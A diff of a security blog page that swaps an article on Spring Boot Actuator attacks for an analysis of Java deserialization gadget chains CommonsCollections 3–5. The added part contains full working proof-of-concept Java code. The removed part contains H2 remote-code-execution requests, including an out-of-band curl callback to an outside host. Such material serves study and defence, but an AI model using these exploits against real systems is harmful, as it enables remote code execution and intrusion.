@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>应用安全-Spring利用方式 | 六月的雨</title>
+  <title>Java反序列化-CommonsCollections3-5分析 | 六月的雨</title>
   <meta name="keywords" content=" Hexo , Markdown ">
-  <meta name="description" content="应用安全-Spring利用方式 | 六月的雨">
+  <meta name="description" content="Java反序列化-CommonsCollections3-5分析 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Java反序列化CommonsCollections3-5分析版本要求：  jdk1.7 Commons Collections 3.1  添加依赖：     &lt;dependency&gt;       &lt;groupId&gt;org.javassist&lt;&#x2F;groupId&gt;       &lt;artifactId&gt;javassist&lt;&#x2F;artifactId&amp;g">
 <meta property="og:type" content="article">
@@ -621,9 +621,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-应用安全-Spring利用方式" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Java反序列化-CommonsCollections3分析" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">应用安全-Spring利用方式</h1>
+        <h1 class="article-title">Java反序列化-CommonsCollections3-5分析</h1>
     
     <div class="article-meta">
         
@@ -633,7 +633,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="应用安全">应用安全</a>
+            <a  data-rel="Java反序列化">Java反序列化</a>
             
         </span>
         
@@ -650,12 +650,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-11-20 22:19:48'>2021-11-20 22:19</time>
+            Created At : <time class="date" title='Updated At: 2021-12-12 20:36:43'>2021-12-06 22:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:920</span>
+        <span>Count:2.2k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -685,7 +685,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD"><span class="toc-text">安全措施</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections3-5%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections3-5分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x02 利用链分析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections4%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections4分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE-1"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A-1"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x03 利用链分析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections5%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections5分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE-2"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A-2"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="toc-text">0x02 利用链分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -701,83 +701,337 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>推荐资料：</p>
+        <h1 id="Java反序列化CommonsCollections3-5分析"><a href="#Java反序列化CommonsCollections3-5分析" class="headerlink" title="Java反序列化CommonsCollections3-5分析"></a>Java反序列化CommonsCollections3-5分析</h1><p>版本要求：</p>
 <ul>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">Spring 框架漏洞集合</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cwkiller/p/12829974.html">Spring Boot Actuator H2 RCE复现</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91a5ca9b7c1c">Spring Boot Actuator(eureka xstream deserialization RCE)</a></p>
-</li>
+<li>jdk1.7</li>
+<li>Commons Collections 3.1</li>
 </ul>
-<p><strong>Spring</strong> 是为解决企业应用开发的复杂性而创建的一个开源框架。<br>主要的设计思想是有两个：</p>
+<p>添加依赖：</p>
+<pre><code>    &lt;dependency&gt;
+      &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+      &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+      &lt;version&gt;3.20.0-GA&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+      &lt;version&gt;3.2.1&lt;/version&gt;
+    &lt;/dependency&gt;
+</code></pre>
+<h2 id="0x01利用链"><a href="#0x01利用链" class="headerlink" title="0x01利用链"></a>0x01利用链</h2><pre><code>ObjectInputStream.readObject()
+            AnnotationInvocationHandler.readObject()
+                Map(Proxy).entrySet()
+                    AnnotationInvocationHandler.invoke()
+                        LazyMap.get()
+                            ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InstantiateTransformer.transform()
+                            newInstance()
+                                TrAXFilter#TrAXFilter()
+                                TemplatesImpl.newTransformer()
+                                         TemplatesImpl.getTransletInstance()
+                                         TemplatesImpl.defineTransletClasses
+                                         newInstance()
+                                            Runtime.exec()
+</code></pre>
+<h2 id="0x02-POC："><a href="#0x02-POC：" class="headerlink" title="0x02 POC："></a>0x02 POC：</h2><pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc3Test &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+        //CC2前半条链
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+//动态创建一个静态代码块，内容是Runtime.getRuntime().exec(&quot;calc&quot;)
+        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
+        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
+        CtClass cc=classPool.makeClass(&quot;cmd&quot;);//创建一个新的public类
+        cc.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
+        cc.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); // 创建 static 代码块，并插入代码
+
+        // 写入.class 文件
+        byte[] classBytes = cc.toBytecode();
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        Field field=templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);//反射获取templatesImpl的_bytecodes字段
+        field.setAccessible(true);//暴力反射
+        field.set(templates,new byte[][]&#123;classBytes&#125;);//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
+        Field field1=templates.getClass().getDeclaredField(&quot;_name&quot;);//反射获取templatesImpl的_name字段
+        field1.setAccessible(true);//暴力反射
+        field1.set(templates,&quot;test&quot;);//将templatesImpl上的_name字段设置为test
+
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
+        &#125;);
+        //CC1前半条链
+        HashMap innermap = new HashMap();
+        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
+        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+        handler_constructor.setAccessible(true);
+        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
+        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象
+        Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
+        AnnotationInvocationHandler_Constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
+
+        try&#123;
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc3&quot;));
+            outputStream.writeObject(handler);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc3&quot;));
+            inputStream.readObject();
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+
+&#125;
+</code></pre>
+<h2 id="0x02-利用链分析："><a href="#0x02-利用链分析：" class="headerlink" title="0x02 利用链分析："></a>0x02 利用链分析：</h2><p>从上面的利用链和POC，我们可以看出，CC3其实就是CC1+CC2组合，然后修改了中间，CC3利用 TrAXFilter#TrAXFilter()来调用TemplatesImpl.newTransformer()，而CC2中是利用InvokerTransformer利用反射调用newTransformer。</p>
+<p>所以先学完CC1和CC2，再来看CC3就会很简单了。</p>
+<pre><code>CC1链前半条
+ObjectInputStream.readObject()
+            AnnotationInvocationHandler.readObject()
+                Map(Proxy).entrySet()
+                    AnnotationInvocationHandler.invoke()
+                        LazyMap.get()
+                            ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                           
+                           ........
+                            
+       
+                                TemplatesImpl.newTransformer()
+                                         TemplatesImpl.getTransletInstance()
+                                         TemplatesImpl.defineTransletClasses
+                                         newInstance()
+                                            Runtime.exec()
+</code></pre>
+<p>上图我将CC1和CC2拼接的利用链，可以看到中间缺少了可以调用  TemplatesImpl.newTransformer()的方法。</p>
+<p>所以CC3中用到了InstantiateTransformer方法和TrAXFilter方法来连接前后两条链，形成完整的CC3链。</p>
+<p>这里先分析InstantiateTransformer方法，先看POC中的部分代码，也就这部分代码是新增的，其他代码都是CC1和CC2的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210151557527.png" alt="image-20211210151557527"></p>
+<p>ConstantTransformer方法将TrAXFilter.class返回给InstantiateTransformer的transfrom方法，并且将templates作为参数添加到InstantiateTransformer的构造函数中。</p>
+<p>我们进入InstantiateTransformer方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210151857835.png" alt="image-20211210151857835"></p>
+<p>第一个框将templates赋值给args，然后调用了InstantiateTransformer的transfrom方法，形参input就是TrAXFilter.class，第二个方框，调用了TrAXFilter.class的构造器并进行实例化对象。</p>
+<p>跟进TrAXFilter方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210152333632.png" alt="image-20211210152333632"></p>
+<p>第二个方框，构造函数内部会调用 templates.newTransformer() ，newTransformer 应该都很熟悉了，调用该函数就会触发 Templates 加载恶意字节码从而代码执行。</p>
+<h1 id="CommonsCollections4分析"><a href="#CommonsCollections4分析" class="headerlink" title="CommonsCollections4分析"></a>CommonsCollections4分析</h1><p>版本要求：</p>
 <ul>
-<li><code>控制反转IOC</code><br>IOC是一种设计思想，将原本在程序中自己手动创建对象的控制权，交由 Spring 框架来管理。</li>
-<li><code>面向方面编程AOP</code><br>利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为”Aspect”，即切面。</li>
+<li>JDK无要求</li>
+<li>CommonsCollections 4.0</li>
 </ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>nmap -Pn -T4  -p 8080  -sV --version-all 192.168.79.28
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 17:18 CST
-Nmap scan report for 192.168.79.28
-Host is up (0.00019s latency).
-
-PORT     STATE SERVICE    VERSION
-8080/tcp open  http-proxyzsh复制代码
+<p>添加依赖：</p>
+<pre><code>    &lt;dependency&gt;
+      &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+      &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+      &lt;version&gt;3.20.0-GA&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+      &lt;version&gt;4.0&lt;/version&gt;
+    &lt;/dependency&gt;
 </code></pre>
-<p>访问不存在的页面包含以下信息证明使用了Spring Boot</p>
-<pre><code>Whitelabel Error Page
-
-This application has no explicit mapping for /error, so you are seeing this as a fallback.
-Tue Dec 15 09:35:57 GMT 2020
-There was an unexpected error (type=Not Found, status=404).
-No message availablehtml复制代码
+<h2 id="0x01利用链-1"><a href="#0x01利用链-1" class="headerlink" title="0x01利用链"></a>0x01利用链</h2><pre><code>ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                PriorityQueue.siftDownUsingComparator()
+                    TransformingComparator.compare()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InstantiateTransformer.transform()
+                            newInstance()
+                                TrAXFilter#TrAXFilter()
+                                TemplatesImpl.newTransformer()
+                                         TemplatesImpl.getTransletInstance()
+                                         TemplatesImpl.defineTransletClasses
+                                         newInstance()
+                                            Runtime.exec()
 </code></pre>
-<p>Spring API信息获取</p>
-<pre><code>curl -v &#39;http://192.168.79.28:8080/trace&#39;  # 获取用户认证字段
-curl -v &#39;http://192.168.79.28:8080/env&#39;    # 服务器配置信息，包括数据库
-curl -v &#39;http://192.168.79.28:8080/health&#39;  # 泄漏git项目地址
-curl -v &#39;http://192.168.79.28:8080/heapdump&#39; # 泄漏后台用户信息
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
+<h2 id="0x02-POC：-1"><a href="#0x02-POC：-1" class="headerlink" title="0x02 POC："></a>0x02 POC：</h2><pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
 
-## Spring Boot Actuator H2 with HikariCP远程代码执行
+public class cc4 &#123;
+    public static void main(String[] args) throws Exception &#123;
+       
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+//动态创建一个静态代码块，内容是Runtime.getRuntime().exec(&quot;calc&quot;)
+        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
+        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
+        CtClass cc=classPool.makeClass(&quot;cmd&quot;);//创建一个新的public类
+        cc.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
+        cc.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); // 创建 static 代码块，并插入代码
 
-**Actuator** 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。  
+        // 写入.class 文件
+        byte[] classBytes = cc.toBytecode();
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        Field field=templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);//反射获取templatesImpl的_bytecodes字段
+        field.setAccessible(true);//暴力反射
+        field.set(templates,new byte[][]&#123;classBytes&#125;);//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
+        Field field1=templates.getClass().getDeclaredField(&quot;_name&quot;);//反射获取templatesImpl的_name字段
+        field1.setAccessible(true);//暴力反射
+        field1.set(templates,&quot;test&quot;);//将templatesImpl上的_name字段设置为test
 
-Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
+        &#125;);
+        
+        TransformingComparator comparator =new TransformingComparator(chain);
+        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
+        queue.add(1);//添加数字1插入此优先级队列
+        queue.add(2);//添加数字1插入此优先级队列
 
-更多[Spring Boot Rest API](https://howtodoinjava.com/spring-boot2/rest/rest-api-example/)
+        Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);//获取PriorityQueue的comparator字段
+        field2.setAccessible(true);//暴力反射
+        field2.set(queue,comparator);//设置queue的comparator字段值为comparator
 
-```zsh
- curl  &#39;http://192.168.79.28:8080/actuator&#39;  # 查看actuator下的端点actuator/env
-&#123;&quot;_links&quot;:&#123;&quot;self&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator&quot;,&quot;templated&quot;:false&#125;,&quot;env-toMatch&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env/&#123;toMatch&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;env&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env&quot;,&quot;templated&quot;:false&#125;,&quot;restart&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/restart&quot;,&quot;templated&quot;:false&#125;&#125;&#125;%zsh复制代码
+
+        try&#123;
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc4&quot;));
+            outputStream.writeObject(queue);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc4&quot;));
+            inputStream.readObject();
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+&#125;
 </code></pre>
-<p>发送EXP</p>
-<pre><code>POST /actuator/env HTTP/1.1
-
-content-type: application/json
-
-&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&#125;
-
-
-POST /actuator/restart HTTP/1.1
-
-content-type: application/json
-
-&#123;&#125;
-json复制代码
-curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; --data-binary $&#39;&#123;\&quot;name\&quot;:\&quot;spring.datasource.hikari.connection-test-query\&quot;,\&quot;value\&quot;:\&quot;CREATE ALIAS EXEC AS CONCAT(\&#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\&#39;,\&#39; java.util.Scanner(Runtime.getRun\&#39;,\&#39;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\&#39;);CALL EXEC(\&#39;curl http://x.burpcollaborator.net\&#39;);\&quot;&#125;&#39; &#39;http://192.168.79.28:8080/actuator/env&#39;
-
-#发送exp
-curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; &#39;http://192.168.79.28:8080/actuator/restart&#39;   # 触发expzsh复制代码
+<h2 id="0x03-利用链分析："><a href="#0x03-利用链分析：" class="headerlink" title="0x03 利用链分析："></a>0x03 利用链分析：</h2><h1 id="CommonsCollections5分析"><a href="#CommonsCollections5分析" class="headerlink" title="CommonsCollections5分析"></a>CommonsCollections5分析</h1><p>版本要求：</p>
+<ul>
+<li>JDK无要求</li>
+<li>CommonsCollections 3.1 - 3.2.1</li>
+</ul>
+<p>添加依赖：</p>
+<h2 id="0x01利用链-2"><a href="#0x01利用链-2" class="headerlink" title="0x01利用链"></a>0x01利用链</h2><pre><code>        ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
 </code></pre>
-<h3 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h3><ol>
-<li>引入 security 依赖，打开安全限制并进行身份验证</li>
-<li>设置单独的 Actuator 管理端口并配置不对外网开放</li>
-</ol>
+<h2 id="0x02-POC：-2"><a href="#0x02-POC：-2" class="headerlink" title="0x02 POC："></a>0x02 POC：</h2><pre><code>import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc5 &#123;
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;
+
+        //反序列化利用链
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+                new ConstantTransformer(Runtime.class), // 返回 java.lang.Runtime,但我们知道Runtime.class经过getClass()，之后返回的只会是java.lang.Class
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),  //利用Runtime.class中的getMethod 获取getRuntime，这样我们就能得到一个Runtime实例
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),      // 上面返回的应该是getRuntime的这个静态方法 获取反射类中的invoke类执行getRuntime
+                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);//MAC&quot;calc&quot;换成&quot;open -a Calculator&quot;  // 调用返回实例中的exec
+
+        HashMap innermap = new HashMap();
+        Class clazz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;); //创建LazyMap的Class
+        Constructor[] constructors = clazz.getDeclaredConstructors();    //调用LazyMap的空参构造器
+        Constructor constructor = constructors[0];
+        constructor.setAccessible(true);
+        Map map = (Map)constructor.newInstance(innermap,chain);            //使用构造器创建对象，传入数组，和调用链，这里触发调用链的RCE
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 123);
+        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
+        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);
+        val.setAccessible(true);
+        val.set(poc,tiedMapEntry);
+
+        try&#123;
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc5&quot;));
+            outputStream.writeObject(poc);//序列化handle到cc1文件中
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc5&quot;));
+            inputStream.readObject(); //恢复对象，反序列化使用readObject获取对象，这里调用了AnnotationInvocationHandler被重写的readObject
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+&#125;
+</code></pre>
+<h2 id="0x02-利用链分析：-1"><a href="#0x02-利用链分析：-1" class="headerlink" title="0x02 利用链分析："></a>0x02 利用链分析：</h2><p>我在CC1中提到：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210161612604.png" alt="image-20211210161612604"></p>
+<p>而CC1中是使用AnnotationInvocationHandler，所以我们这里的思路是要找到能调用LazyMap#get方法，并且能使用ReadObject重写当作入口的一个类。</p>
+<p>找到了tiedMapEntry#toString：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210175337100.png" alt="image-20211210175337100"></p>
+<p>跟进getValue方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210175443072.png" alt="image-20211210175443072"></p>
+<p>可以发现这里对this.map调用了get方法，并将key传递进去，所以这里只需要令map为我们前面构造好的LazyMap，即可触发rce。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210175549699.png" alt="image-20211210175549699"></p>
+<p>然后我们使用BadAttributeValueExpException（重写了readObject方法）去调用tiedMapEntry#toString：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210180112155.png" alt="image-20211210180112155"></p>
+<pre><code>private Object val;
+</code></pre>
+<p>valObj是从Filed中取出来的，那么利用方式也就很清晰了，通过反射来设置BadAttributeValueExpException中val的值为TiedMapEntry即可触发命令执行。</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#_8">https://paper.seebug.org/1242/#_8</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219840#h2-0">https://www.anquanke.com/post/id/219840#h2-0</a></p>
+<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1535">http://wjlshare.com/archives/1535</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -791,12 +1045,12 @@ curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; &#39;http://1
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">Title:</span>应用安全-Spring利用方式</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">920</span></p>
+    <p><span class="copy-title">Title:</span>Java反序列化-CommonsCollections3-5分析</p>
+    <p><span class="copy-title">Count:</span><span class="post-count">2.2k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
-    <p><span class="copy-title">Created At:</span>2021-11-20, 22:19:40</p>
